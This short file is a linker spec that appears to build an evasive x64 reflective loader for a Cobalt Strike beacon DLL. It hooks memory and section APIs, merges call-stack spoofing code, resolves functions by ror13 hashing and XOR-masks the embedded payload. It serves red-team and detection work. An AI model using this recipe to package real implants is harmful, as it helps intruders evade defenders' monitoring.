x64:
	load "../bin/loader.x64.o"
		make pic +gofirst
	mergelib "../Crystal-palace/libtcg.x64.zip"
	dfr "resolve" "ror13"

	load "../bin/hooks.x64.o"     # load and merge the hooks COFF
        merge
    
    load "../bin/spoof.x64.o"     # load and merge the spoof COFF
        merge

    load "../bin/draugr.x64.bin"  # load and link the assembly stub
        linkfunc "draugr_stub"

	#hooked functions
	attach "KERNEL32$CreateFileW"         "_CreateFileW"
    attach "KERNEL32$CloseHandle"         "_CloseHandle"
    attach "KERNEL32$VirtualAlloc"        "_VirtualAlloc"
    attach "KERNEL32$VirtualProtect"      "_VirtualProtect"
    attach "KERNEL32$RtlAddFunctionTable" "_RtlAddFunctionTable"
    attach "NTDLL$NtCreateSection"        "_NtCreateSection"
    attach "NTDLL$NtMapViewOfSection"     "_NtMapViewOfSection"
    attach "NTDLL$NtClose"                "_NtClose"
    attach "NTDLL$memset"                 "_memset"
    attach "NTDLL$memcpy"                 "_memcpy"
	attach "KERNEL32$LoadLibraryA"   "_LoadLibraryA"
    attach "KERNEL32$VirtualFree" "_VirtualFree"

	preserve "KERNEL32$LoadLibraryA" "init_frame_info" #does not hook the API in init_frame_info

    generate $MASK 128

	push $DLL
        xor $MASK
        preplen
		link "cobalt_dll"
	
    push $MASK
        preplen
        link "cobalt_mask"
    run "pico.spec"
        link "pico"
    
    run "yara.spec"

	export
